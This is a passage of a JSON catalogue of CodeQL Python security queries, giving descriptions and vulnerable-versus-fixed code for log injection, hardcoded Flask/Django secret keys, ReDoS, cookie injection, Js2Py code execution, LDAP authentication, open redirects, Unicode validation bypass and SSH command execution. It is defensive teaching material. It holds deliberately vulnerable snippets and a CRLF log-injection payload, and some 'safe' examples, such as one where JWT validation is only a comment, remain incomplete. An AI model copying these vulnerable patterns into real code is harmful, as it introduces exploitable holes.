`Guest%0D%0AUser name: Admin` as a parameter, the log entry will be divided into two lines, the first line is `User name: Guest` code&gt;, the second line is `User name: Admin`.\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\"\"\"\n@Desc   \uff1aLog Injection\n\"\"\"\nfrom flask import Flask\nfrom flask import request\nfrom django.utils.log import request_logger\nimport logging\n\nlogging.basicConfig(level=logging.DEBUG)\n\napp = Flask(__name__)\n\n@app.route('/bad1')\ndef bad1():\n    name = request.args.get('name')\n    app.logger.info('User name: ' + name) # Bad\n    return 'bad1'\n\n@app.route('/bad2')\ndef bad2():\n    name = request.args.get('name')\n    logging.info('User name: ' + name) # Bad\n    return 'bad2'\n\n@app.route('/bad3')\ndef bad3():\n    name = request.args.get('name')\n    request_logger.warn('User name: ' + name) # Bad\n    return 'bad3'\n\n@app.route('/bad4')\ndef bad4():\n    name = request.args.get('name')\n    logtest = logging.getLogger('test')\n    logtest.debug('User name: ' + name) # Bad\n    return 'bad4'\n\nif __name__ == '__main__':\n    app.debug = True\n    handler = logging.FileHandler('log')\n    app.logger.addHandler(handler)\n    app.run()\n\n```\nIn a good example, the program uses the `replace` function to provide parameter processing to the user, and replace `\\r\\n` and `\\n` with empty characters. To a certain extent, the occurrence of log injection vulnerabilities is reduced.\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\"\"\"\n@Desc   \uff1aLog Injection\n\"\"\"\nfrom flask import Flask\nfrom flask import request\nimport logging\n\nlogging.basicConfig(level=logging.DEBUG)\n\napp = Flask(__name__)\n\n@app.route('/good1')\ndef good1():\n    name = request.args.get('name')\n    name = name.replace('\\r\\n','').replace('\\n','')\n    logging.info('User name: ' + name) # Good\n    return 'good1'\n\nif __name__ == '__main__':\n    app.debug = True\n    handler = logging.FileHandler('log')\n    app.logger.addHandler(handler)\n    app.run()\n\n```\n\n## References\n* OWASP: [Log Injection](https://owasp.org/www-community/attacks/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n"
  },
  "py/flask-constant-secret-key": {
    "name": "Initializing SECRET_KEY of Flask application with Constant value",
    "description": "Initializing SECRET_KEY of Flask application with Constant value files can lead to Authentication bypass",
    "kind": "path-problem",
    "id": "py/flask-constant-secret-key",
    "problem.severity": "error",
    "security-severity": 8.5,
    "precision": "high",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-287"
    ],
    "filename": "324dc630-WebAppConstantSecretKey",
    "language": "python",
    "help": "# Initializing SECRET_KEY of Flask application with Constant value\nFlask and Django require a Securely signed key for singing the session cookies. most of the time developers rely on load hardcoded secret keys from a config file or python code. this proves that the way of hardcoded secret can make problems when you forgot to change the constant secret keys.\n\n\n## Recommendation\nIn Flask Consider using a secure random generator with [Python standard secrets library](https://docs.python.org/3/library/secrets.html#secrets.token_hex)\n\nIn Django Consider using a secure random generator with \"get_random_secret_key()\"\" method from \"django.core.management.utils\".\n\n\n## Example\nSafe Django SECRET_KEY\n\n\n```python\nimport sys\n\nfrom django.conf import settings\nfrom django.conf import global_settings\nfrom django.urls import path\nfrom django.http import HttpResponse\nfrom django.core.management.utils import get_random_secret_key\n\nsettings.configure(\n    DEBUG=True,\n    SECRET_KEY=get_random_secret_key(),\n    ROOT_URLCONF=__name__,\n)\nglobal_settings.SECRET_KEY = get_random_secret_key()\nsettings.SECRET_KEY = get_random_secret_key()\n\n\ndef home(request):\n    return HttpResponse(settings.SECRET_KEY)\n\n\nurlpatterns = [\n    path(\"\", home),\n]\n\nif __name__ == \"__main__\":\n    from django.core.management import execute_from_command_line\n\n    if len(sys.argv) == 1:\n        sys.argv.append(\"runserver\")\n        sys.argv.append(\"8080\")\n    execute_from_command_line(sys.argv)\n\n```\nUnsafe Django SECRET_KEY Example:\n\n\n```python\nimport sys\nimport environ\nfrom django.conf import settings\nfrom django.conf import global_settings\nfrom django.urls import path\nfrom django.http import HttpResponse\n\nenv = environ.Env(\n    SECRET_KEY=(str, \"AConstantKey\")\n)\nenv.read_env(env_file='.env')\n# following is not safe if there is default value in Env(..)\nsettings.SECRET_KEY = env('SECRET_KEY')\n\nsettings.configure(\n    DEBUG=True,\n    SECRET_KEY=\"constant1\",\n    ROOT_URLCONF=__name__,\n)\nglobal_settings.SECRET_KEY = \"constant2\"\nsettings.SECRET_KEY = \"constant3\"\n\n\ndef home(request):\n    return HttpResponse(settings.SECRET_KEY)\n\n\nurlpatterns = [\n    path(\"\", home),\n]\n\nif __name__ == \"__main__\":\n    from django.core.management import execute_from_command_line\n\n    if len(sys.argv) == 1:\n        sys.argv.append(\"runserver\")\n        sys.argv.append(\"8080\")\n    execute_from_command_line(sys.argv)\n\n```\nSafe Flask SECRET_KEY Example:\n\n\n```python\nfrom flask import Flask, session\nfrom secrets import token_hex\n\napp = Flask(__name__)\napp.secret_key = token_hex(16)\napp.config.from_pyfile(\"config3.py\")\n\n\n@app.route('/')\ndef CheckForSecretKeyValue():\n    # debugging whether secret_key is secure or not\n    return app.secret_key, session.get('logged_in')\n\n\nif __name__ == '__main__':\n    app.run()\n\n```\n\n```python\nfrom flask import Flask, session\n\napp = Flask(__name__)\naConstant = 'CHANGEME1'\napp.config['SECRET_KEY'] = aConstant\napp.secret_key = aConstant\napp.config.update(SECRET_KEY=aConstant)\napp.config.from_mapping(SECRET_KEY=aConstant)\napp.config.from_pyfile(\"config.py\")\napp.config.from_pyfile(\"config2.py\")\napp.config.from_object('config.Config')\napp.config.from_object('config2.Config')\napp.config.from_object('settings')\n\n\n@app.route('/')\ndef CheckForSecretKeyValue():\n    # debugging whether secret_key is secure or not\n    return app.secret_key, session.get('logged_in')\n\n\nif __name__ == '__main__':\n    app.run()\n\n```\nUnsafe Flask SECRET_KEY Example:\n\n\n```python\nfrom flask import Flask, session\n\napp = Flask(__name__)\naConstant = 'CHANGEME1'\nSECRET_KEY = aConstant\napp.config.from_object(__name__)\n\n\n@app.route('/')\ndef DEB_EX():\n    if 'logged_in' not in session:\n        session['logged_in'] = 'value'\n    # debugging whether secret_key is secure or not\n    return app.secret_key, session.__str__()\n\n\nif __name__ == '__main__':\n    app.run()\n\n```\nconfig1.py\n\n\n```python\n\"\"\"Flask App configuration.\"\"\"\nfrom os import environ\nimport os\nimport random\nimport configparser\n\nFLASK_DEBUG = True\naConstant = 'CHANGEME2'\nconfig = configparser.ConfigParser()\n\n\nclass Config:\n    SECRET_KEY = config[\"a\"][\"Secret\"]\n    SECRET_KEY = config.get(\"key\", \"value\")\n    SECRET_KEY = environ.get(\"envKey\")\n    SECRET_KEY = aConstant\n    SECRET_KEY = os.getenv('envKey')\n    SECRET_KEY = os.environ.get('envKey')\n    SECRET_KEY = os.environ.get('envKey', random.randint)\n    SECRET_KEY = os.getenv('envKey', random.randint)\n    SECRET_KEY = os.getenv('envKey', aConstant)\n    SECRET_KEY = os.environ.get('envKey', aConstant)\n    SECRET_KEY = os.environ['envKey']\n\n```\nconfig2.py\n\n\n```python\n\"\"\"Flask App configuration.\"\"\"\n\naConstant = 'CHANGEME2'\n\nSECRET_KEY = aConstant\n\n\nclass Config:\n    SECRET_KEY = aConstant\n\n```\nconfig3.py\n\n\n```python\n\"\"\"Flask App configuration.\"\"\"\nimport os\n\n# General Config\nFLASK_DEBUG = True\n# if we are loading SECRET_KEY from config files then\n# it is good to check default value always, maybe\n# the user responsible for setup the application make a mistake\n# and has not changed the default SECRET_KEY value\nSECRET_KEY = os.getenv('envKey', \"A_CONSTANT_SECRET\")  # A_CONSTANT_SECRET\nif SECRET_KEY == \"A_CONSTANT_SECRET\":\n    raise \"not possible\"\n\n```\n__init__.py\n\n\n```python\nimport os\n\nSECRET_KEY = \"REDASH_COOKIE_SECRET\"\n\n```\n\n## References\n* [Flask Documentation](https://flask.palletsprojects.com/en/2.3.x/config/#SECRET_KEY)\n* [Django Documentation](https://docs.djangoproject.com/en/4.2/ref/settings/#secret-key)\n* [Flask-JWT-Extended Documentation](https://flask-jwt-extended.readthedocs.io/en/stable/basic_usage.html#basic-usage)\n* [CVE-2023-27524 - Apache Superset had multiple CVEs related to this kind of Vulnerability](https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/)\n* [CVE-2020-17526 - Apache Airflow had multiple CVEs related to this kind of Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2020-17526)\n* [CVE-2021-41192 - Redash was assigning a environment variable with a default value which it was assigning the default secrect if the environment variable does not exists](https://nvd.nist.gov/vuln/detail/CVE-2021-41192)\n* Common Weakness Enumeration: [CWE-287](https://cwe.mitre.org/data/definitions/287.html).\n"
  },
  "py/count-untrusted-data-external-api": {
    "name": "Frequency counts for external APIs that are used with untrusted data",
    "description": "This reports the external APIs that are used with untrusted data, along with how frequently the API is called, and how many unique sources of untrusted data flow to it.",
    "id": "py/count-untrusted-data-external-api",
    "kind": "table",
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "7792de3c-ExternalAPIsUsedWithUntrustedData",
    "language": "python",
    "help": "# Frequency counts for external APIs that are used with untrusted data\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that are used with untrusted data, along with how frequently the API is used, and how many unique sources of untrusted data flow to this API. This query is designed primarily to help identify which APIs may be relevant for security analysis of this application.\n\nAn external API is defined as a call to a method that is not defined in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the Python standard library or dependencies. The query will report the fully qualified name, along with `[position index]` or `[keyword name]`, to indicate the argument passing the untrusted data.\n\nNote that an excepted sink might not be included in the results, if it also defines a taint step. This is the case for `pickle.loads` which is a sink for the Unsafe Deserialization query, but is also a taint step for other queries.\n\nNote: Compared to the Java version of this query, we currently do not give special care to methods that are overridden in the source code.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, no action is required.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query.\n* If the result represents a call to an external API which transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPI` class and specify `getSafeCallable` to exclude known safe external APIs from future analysis.\n\n\n## Example\nIf the query were to return the API `flask.make_response [param 0]` then we should first consider whether this a security relevant sink. In this case, this is making a HTTP response, so we should consider whether this is an XSS sink. If it is, we should confirm that it is handled by the XSS query.\n\nIf the query were to return the API `base64.decodebytes [param 0]`, then this should be reviewed as a possible taint step, because tainted data would flow from the 0th argument to the result of the call.\n\nNote that both examples are correctly handled by the standard taint tracking library and XSS query.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "py/redos": {
    "name": "Inefficient regular expression",
    "description": "A regular expression that requires exponential time to match certain inputs can be a performance bottleneck, and may be vulnerable to denial-of-service attacks.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/redos",
    "tags": [
      "security",
      "external/cwe/cwe-1333",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "19a7ad06-ReDoS",
    "language": "python",
    "help": "# Inefficient regular expression\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engine provided by Python uses a backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this regular expression:\n\n```python\n\n^_(__|.)+_$\n```\nIts sub-expression `\"(__|.)+?\"` can match the string `\"__\"` either by the first alternative `\"__\"` to the left of the `\"|\"` operator, or by two repetitions of the second alternative `\".\"` to the right. Thus, a string consisting of an odd number of underscores followed by some other character will cause the regular expression engine to run for an exponential amount of time before rejecting the input.\n\nThis problem can be avoided by rewriting the regular expression to remove the ambiguity between the two branches of the alternative inside the repetition:\n\n```python\n\n^_(__|[^_])+_$\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "py/cookie-injection": {
    "name": "Construction of a cookie using user-supplied input",
    "description": "Constructing cookies from user input may allow an attacker to perform a Cookie Poisoning attack.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "high",
    "security-severity": 5.0,
    "id": "py/cookie-injection",
    "tags": [
      "security",
      "external/cwe/cwe-20"
    ],
    "filename": "dfdda0ff-CookieInjection",
    "language": "python",
    "help": "# Construction of a cookie using user-supplied input\nConstructing cookies from user input can allow an attacker to control a user's cookie. This may lead to a session fixation attack. Additionally, client code may not expect a cookie to contain attacker-controlled data, and fail to sanitize it for common vulnerabilities such as Cross Site Scripting (XSS). An attacker manipulating the raw cookie header may additionally be able to set cookie attributes such as `HttpOnly` to insecure values.\n\n\n## Recommendation\nDo not use raw user input to construct cookies.\n\n\n## Example\nIn the following cases, a cookie is constructed for a Flask response using user input. The first uses `set_cookie`, and the second sets a cookie's raw value through the `set-cookie` header.\n\n\n```python\nfrom flask import request, make_response\n\n\n@app.route(\"/1\")\ndef set_cookie():\n    resp = make_response()\n    resp.set_cookie(request.args[\"name\"], # BAD: User input is used to set the cookie's name and value\n                    value=request.args[\"name\"])\n    return resp\n\n\n@app.route(\"/2\")\ndef set_cookie_header():\n    resp = make_response()\n    resp.headers['Set-Cookie'] = f\"{request.args['name']}={request.args['name']};\" # BAD: User input is used to set the raw cookie header.\n    return resp\n\n```\n\n## References\n* Wikipedia - [Session Fixation](https://en.wikipedia.org/wiki/Session_fixation).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "py/js2py-rce": {
    "name": "JavaScript code execution.",
    "description": "Passing user supplied arguments to a Javascript to Python translation engine such as Js2Py can lead to remote code execution.",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "kind": "path-problem",
    "id": "py/js2py-rce",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-94"
    ],
    "filename": "9f256f93-Js2Py",
    "language": "python",
    "help": "# JavaScript code execution.\nPassing untrusted inputs to a JavaScript interpreter like \\`Js2Py\\` can lead to arbitrary code execution.\n\n\n## Recommendation\nThis vulnerability can be prevented either by preventing an untrusted user input to flow to an `eval_js` call. Or, the impact of this vulnerability can be significantly reduced by disabling imports from the interepreted code (note that in a [ comment](https://github.com/PiotrDabkowski/Js2Py/issues/45#issuecomment-258724406) the author of the library highlights that Js2Py is still insecure with this option).\n\n\n## Example\nIn the example below, the Javascript code being evaluated is controlled by the user and hence leads to arbitrary code execution.\n\n\n```python\n@bp.route(\"/bad\")\ndef bad():\n    jk = flask.request.form[\"jk\"]\n    jk = eval_js(f\"{jk} f()\")\n\n```\nThis can be fixed by disabling imports before evaluating the user passed buffer.\n\n\n```python\n@bp.route(\"/good\")\ndef good():\n    # disable python imports to prevent execution of malicious code \n    js2py.disable_pyimport()\n    jk = flask.request.form[\"jk\"]\n    jk = eval_js(f\"{jk} f()\")\n\n```\n"
  },
  "py/improper-ldap-auth": {
    "name": "Improper LDAP Authentication",
    "description": "A user-controlled query carries no authentication",
    "kind": "problem",
    "problem.severity": "warning",
    "id": "py/improper-ldap-auth",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-287"
    ],
    "filename": "263bd3b5-ImproperLdapAuth",
    "language": "python",
    "help": "# Improper LDAP Authentication\nIf an LDAP query doesn't carry any kind of authentication, anonymous binds causes an empty or None-set password to result in a successful authentication.\n\n\n## Recommendation\nUse a non-empty password while establishing an LDAP connection.\n\n\n## Example\nIn the following examples, the code builds a LDAP query whose execution carries no authentication or binds anonymously.\n\n\n```python\nfrom flask import request, Flask\nimport ldap\nimport ldap.filter\nimport ldap.dn\n\n\n@app.route(\"/bind_example\")\ndef bind_example():\n    dn = \"dc={}\".format(ldap.dn.escape_dn_chars(request.args['dc']))\n    search_filter = \"(user={})\".format(ldap.filter.escape_filter_chars(request.args['search']))\n\n    ldap_connection = ldap.initialize(\"ldap://127.0.0.1:1337\")\n    ldap_connection.bind('cn=root', \"\")\n    user = ldap_connection.search_s(dn, ldap.SCOPE_SUBTREE, search_filter)\n\n```\n\n```python\nfrom ldap3 import Server, Connection, ALL\nfrom flask import request, Flask\nfrom ldap3.utils.dn import escape_rdn\nfrom ldap3.utils.conv import escape_filter_chars\n\n@app.route(\"/passwordNone\")\ndef passwordNone():\n    dn = \"dc={}\".format(escape_rdn(request.args['dc']))\n    search_filter = \"(user={})\".format(escape_filter_chars(request.args['search']))\n\n    srv = Server('servername', get_info=ALL)\n    conn = Connection(srv, user='user_dn', password=None)\n    status, result, response, _ = conn.search(dn, search_filter)\n\n```\nIn the third and fourth examples, the authentication is established using a password.\n\n\n```python\nfrom flask import request, Flask\nimport ldap\nimport ldap.filter\nimport ldap.dn\n\n\n@app.route(\"/bind_example\")\ndef bind_example():\n    dn = \"dc={}\".format(ldap.dn.escape_dn_chars(request.args['dc']))\n    search_filter = \"(user={})\".format(ldap.filter.escape_filter_chars(request.args['search']))\n\n    ldap_connection = ldap.initialize(\"ldap://127.0.0.1:1337\")\n    ldap_connection.bind('cn=root', \"SecurePa$$!\")\n    user = ldap_connection.search_s(dn, ldap.SCOPE_SUBTREE, search_filter)\n\n```\n\n```python\nfrom ldap3 import Server, Connection, ALL\nfrom flask import request, Flask\nfrom ldap3.utils.dn import escape_rdn\nfrom ldap3.utils.conv import escape_filter_chars\n\n@app.route(\"/passwordFromEnv\")\ndef passwordFromEnv():\n    dn = \"dc={}\".format(escape_rdn(request.args['dc']))\n    search_filter = \"(user={})\".format(escape_filter_chars(request.args['search']))\n\n    srv = Server('servername', get_info=ALL)\n    conn = Connection(srv, user='user_dn',\n                      password=\"SecurePa$$!\")\n    status, result, response, _ = conn.search(dn, search_filter)\n\n```\n\n## References\n* SonarSource: [RSPEC-4433](https://rules.sonarsource.com/python/type/Vulnerability/RSPEC-4433).\n* Python2: [LDAP Documentation](https://www.python-ldap.org/en/python-ldap-3.3.0/reference/ldap.html).\n* Python3: [LDAP Documentation](https://ldap3.readthedocs.io/en/latest/).\n* Common Weakness Enumeration: [CWE-287](https://cwe.mitre.org/data/definitions/287.html).\n"
  },
  "py/url-redirection": {
    "name": "URL redirection from remote source",
    "description": "URL redirection based on unvalidated user input may cause redirection to malicious web sites.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "sub-severity": "low",
    "id": "py/url-redirection",
    "tags": [
      "security",
      "external/cwe/cwe-601"
    ],
    "precision": "high",
    "filename": "5cdc3f24-UrlRedirect",
    "language": "python",
    "help": "# URL redirection from remote source\nDirectly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.\n\n\n## Recommendation\nTo guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.\n\nIf this is not possible, then the user input should be validated in some other way, for example, by verifying that the target URL does not include an explicit host name.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks:\n\n\n```python\nfrom flask import Flask, request, redirect\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello():\n    target = request.args.get('target', '')\n    return redirect(target, code=302)\n\n```\nIf you know the set of valid redirect targets, you can maintain a list of them on the server and check that the user input is in that list:\n\n\n```python\nfrom flask import Flask, request, redirect\n\nVALID_REDIRECT = \"http://cwe.mitre.org/data/definitions/601.html\"\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello():\n    target = request.args.get('target', '')\n    if target == VALID_REDIRECT:\n        return redirect(target, code=302)\n    else:\n        # ignore the target and redirect to the home page\n        return redirect('/', code=302)\n\n```\nOften this is not possible, so an alternative is to check that the target URL does not specify an explicit host name. For example, you can use the `urlparse` function from the Python standard library to parse the URL and check that the `netloc` attribute is empty.\n\nNote, however, that some cases are not handled as we desire out-of-the-box by `urlparse`, so we need to adjust two things, as shown in the example below:\n\n* Many browsers accept backslash characters (`\\`) as equivalent to forward slash characters (`/`) in URLs, but the `urlparse` function does not.\n* Mistyped URLs such as `https:/example.com` or `https:///example.com` are parsed as having an empty `netloc` attribute, while browsers will still redirect to the correct site.\n\n```python\nfrom flask import Flask, request, redirect\nfrom urllib.parse import urlparse\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello():\n    target = request.args.get('target', '')\n    target = target.replace('\\\\', '')\n    if not urlparse(target).netloc and not urlparse(target).scheme:\n        # relative path, safe to redirect\n        return redirect(target, code=302)\n    # ignore the target and redirect to the home page\n    return redirect('/', code=302)\n\n```\nFor Django application, you can use the function `url_has_allowed_host_and_scheme` to check that a URL is safe to redirect to, as shown in the following example:\n\n\n```python\nfrom django.http import HttpResponseRedirect\nfrom django.shortcuts import redirect\nfrom django.utils.http import url_has_allowed_host_and_scheme\nfrom django.views import View\n\nclass RedirectView(View):\n    def get(self, request, *args, **kwargs):\n        target = request.GET.get('target', '')\n        if url_has_allowed_host_and_scheme(target, allowed_hosts=None):\n            return HttpResponseRedirect(target)\n        else:\n            # ignore the target and redirect to the home page\n            return redirect('/')\n```\nNote that `url_has_allowed_host_and_scheme` handles backslashes correctly, so no additional processing is required.\n\n\n## References\n* OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Python standard library: [ urllib.parse](https://docs.python.org/3/library/urllib.parse.html).\n* Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).\n"
  },
  "py/unicode-bypass-validation": {
    "name": "Bypass Logical Validation Using Unicode Characters",
    "description": "A Unicode transformation is using a remote user-controlled data. The transformation is a Unicode normalization using the algorithms \"NFC\" or \"NFKC\". In all cases, the security measures implemented or the logical validation performed to escape any injection characters, to validate using regex patterns or to perform string-based checks, before the Unicode transformation are **bypassable** by special Unicode characters.",
    "kind": "path-problem",
    "id": "py/unicode-bypass-validation",
    "precision": "high",
    "problem.severity": "error",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-176",
      "external/cwe/cwe-179",
      "external/cwe/cwe-180"
    ],
    "filename": "163af97a-UnicodeBypassValidation",
    "language": "python",
    "help": "# Bypass Logical Validation Using Unicode Characters\nSecurity checks bypass due to a Unicode transformation\n\nIf security checks or logical validation is performed before unicode normalization, the security checks or logical validation could be bypassed due to a potential Unicode character collision. The validation we consider are: any character escaping, any regex validation, or any string manipulation (such as `str.split`).\n\n\n## Recommendation\nPerform Unicode normalization before the logical validation.\n\n\n## Example\nThe following example showcases the bypass of all checks performed by ` flask.escape()` due to a post-unicode normalization.\n\nFor instance: the character U+FE64 (`\ufe64`) is not filtered-out by the flask escape function. But due to the Unicode normalization, the character is transformed and would become U+003C (` < ` ).\n\n\n```python\nimport unicodedata\nfrom flask import Flask, request, escape, render_template\n\napp = Flask(__name__)\n\n\n@app.route(\"/unsafe1\")\ndef unsafe1():\n    user_input = escape(request.args.get(\"ui\"))\n    normalized_user_input = unicodedata.normalize(\"NFKC\", user_input)\n    return render_template(\"result.html\", normalized_user_input=normalized_user_input)\n\n```\n\n## References\n* Research study: [ Unicode vulnerabilities that could bYte you ](https://gosecure.github.io/presentations/2021-02-unicode-owasp-toronto/philippe_arteau_owasp_unicode_v4.pdf) and [Unicode pentest cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/).\n* Common Weakness Enumeration: [CWE-176](https://cwe.mitre.org/data/definitions/176.html).\n* Common Weakness Enumeration: [CWE-179](https://cwe.mitre.org/data/definitions/179.html).\n* Common Weakness Enumeration: [CWE-180](https://cwe.mitre.org/data/definitions/180.html).\n"
  },
  "py/paramiko-command-injection": {
    "name": "Command execution on a secondary remote server",
    "description": "user provided command can lead to execute code on a external server that can be belong to other users or admins",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "py/paramiko-command-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-074"
    ],
    "filename": "c823f62d-RemoteCommandExecution",
    "language": "python",
    "help": "# Command execution on a secondary remote server\nAllowing users to execute arbitrary commands using an SSH connection on a remote server can lead to security issues unless you implement proper authorization.\n\nAssume that you connect to a remote system via SSH connection from your main or local server that accepts user-controlled data and has interaction with users that you don't trust, passing these data to SSH API as a part of a command that will be executed on a secondary remote server can lead to security issues. You should consider proper authorization rules very carefully.\n\n\n## Recommendation\nThis vulnerability can be prevented by implementing proper authorization rules for untrusted user input that can be passed to your secondary servers.\n\n\n## Example\nIn the example below, the exec_command is controlled by the user and hence leads to a vulnerability.\n\n\n```python\n#!/usr/bin/env python\n\nfrom flask import request, Flask\nimport paramiko\nfrom paramiko import SSHClient\n\napp = Flask(__name__)\nparamiko_ssh_client = SSHClient()\nparamiko_ssh_client.load_system_host_keys()\nparamiko_ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\nparamiko_ssh_client.connect(hostname=\"127.0.0.1\", port=\"22\", username=\"ssh_user_name\", pkey=\"k\", timeout=11, banner_timeout=200)\n\n\n@app.route('/external_exec_command_1')\ndef withoutAuthorization():\n    user_cmd = request.args.get('command')\n    stdin, stdout, stderr = paramiko_ssh_client.exec_command(user_cmd)\n    return stdout\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run()\n\n\n```\nIn the example below, the exec_command is controlled by the an Authorized user and hence it is safe.\n\n\n```python\n#!/usr/bin/env python\n\nfrom flask import request, Flask\nimport paramiko\nfrom paramiko import SSHClient\n\napp = Flask(__name__)\nparamiko_ssh_client = SSHClient()\nparamiko_ssh_client.load_system_host_keys()\nparamiko_ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\nparamiko_ssh_client.connect(hostname=\"127.0.0.1\", port=\"22\", username=\"ssh_user_name\", pkey=\"k\", timeout=11, banner_timeout=200)\n\n\n@app.route('/external_exec_command_1')\ndef withAuthorization():\n    user_cmd = request.args.get('command')\n    auth_jwt = request.args.get('Auth')\n    # validating jwt token first\n    # .... then continue to run the command\n    stdin, stdout, stderr = paramiko_ssh_client.exec_command(user_cmd)\n    return stdout\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run()\n\n\n```\n"
  },
  "py/insecure-randomness": {
    "name": "Insecure randomness",
    "description": "Using a cryptographically weak pseudo-random number generator to generate a security-sensitive value may allow an attacker to predict what value will be generated.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "py/insecure-randomness",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-338"
    ],
    "filename": "2682bd7b-InsecureRandomness",
    "language": "python",
    "help": "# Insecure randomness\nUsing a cryptographically weak pseudo-random number generator to generate a security-sensitive value, such as a password, makes it easier for an attacker to predict the value.\n\nPseudo-random number generators generate a sequence of numbers that only approximates the properties of random numbers. The sequence is not truly random because it is completely determined by a relatively small set of initial values, the seed. If the random number generator is cryptographically weak, then this sequence may be easily predictable through outside observations.\n\n\n## Recommendation\nUse a cryptographically secure pseudo-random number generator if the output is to be used in a security sensitive context. As a rule of thumb, a value should be considered \"security sensitive\" if predicting it would allow the attacker to perform an action that they would otherwise be unable to perform. For example, if an attacker could predict the random password generated for a new user, they would be able to log in as that new user.\n\nFor Python, `secrets` provides a cryptographically secure pseudo-random number generator. `random` is not cryptographically secure, and should be avoided in security contexts.\n\n\n## Example\nThe example below uses the `random` package instead of `secrets` to generate a password:\n\n\n```python\nimport random\n\n\ndef generatePassword():\n    # BAD: the random is not cryptographically secure\n    return random.random()\n\n```\nInstead, use `secrets`:\n\n\n```python\nimport secrets\n\n\ndef generatePassword():\n    # GOOD: the random is cryptographically secure\n    secret_generator = secrets.SystemRandom()\n    return secret_generator.random()\n\n```\n\n## References\n* Wikipedia. [Pseudo-random number generator](http://en.wikipedia.org/wiki/Pseudorandom_number_generator).\n* OWASP: [Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness).\n* OWASP: [Secure Random Number Generation](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation).\n* Common Weakness Enumeration: [CWE-338](https://cwe.mitre.org/data/definitions/338.html).\n"
  },
  "py/paramiko-missing-host-key-validation": {
    "name": "Accepting unknown SSH host keys when using Paramiko",
    "description": "Accepting unknown host keys can allow man-in-the-middle attacks.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
